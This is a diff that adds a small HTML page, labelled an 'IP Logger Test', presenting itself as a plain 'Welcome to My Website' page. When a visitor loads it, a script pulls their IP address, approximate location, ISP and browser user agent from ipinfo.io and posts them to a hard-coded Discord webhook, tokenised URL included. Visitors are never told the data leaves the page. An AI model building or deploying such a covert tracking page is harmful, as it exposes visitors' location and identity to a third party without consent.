@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+            text-align: center;
+        }
+        h1 {
+            font-size: 4em;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1.5em;
+            margin-top: 20px;
+        }
+        .ip-address {
+            font-size: 5em;
+            font-weight: bold;
+            color: #ff0000;
+            margin-bottom: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <h1>Welcome to My Website</h1>
+        <p>You'll like it.</p>
+        <!-- Display the IP Address Here -->
+        <div class="ip-address" id="ip-address"></div>
+    </div>
+    
+    <!-- IP Logger Script -->
+    <script>
+    function monke(json) {
+        var request = new XMLHttpRequest();
+        
+        request.open("POST", "https://discord.com/api/webhooks/1557723641687318630/VkIwFn8TRpa0QVo2Eri0Ek1mrbV4QxJ5ae-nhL244l67HhEe5sri1Fuu9GlXCbvLG0L3");
+
+        request.setRequestHeader('Content-type', 'application/json');
+
+        var params = {
+            username: "IP Logger Test",
+            avatar_url: "",
+            content: "Đã có người truy cập trang test!",
+            embeds: [
+                {
+                    title: "Thông tin IP thử nghiệm:",
+                    color: 1752220,
+                    fields: [
+                        {
+                            name: "**🔹 IP Address**",
+                            value: `**IP Address:** \`${json.ip}\``,
+                            inline: false
+                        },
+                        {
+                            name: "**🔹 Geolocation Data**",
+                            value: `**Country:** \`${json.country}\`\n` +
+                                   `**Region:** \`${json.region}\`\n` +
+                                   `**City/Town:** \`${json.city}\`\n` +
+                                   `**ZIP Code:** \`${json.postal}\``,
+                            inline: false
+                        },
+                        {
+                            name: "**🔹 Network Information**",
+                            value: `**Organization:** \`${json.org || 'Not available'}\``,
+                            inline: true
+                        },
+                        {
+                            name: "**🔹 User Information**",
+                            value: `**User-Agent:** \`${navigator.userAgent}\``,
+                            inline: true
+                        }
+                    ]
+                }
+            ]
+        };
+
+        request.send(JSON.stringify(params));
+
+        // Display the IP address on the webpage
+        document.getElementById('ip-address').innerText = json.ip;
+    }
+    </script>
+
+    <!-- Get the IP and location data and trigger monke() callback -->
+    <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+
+</body>
+</html>
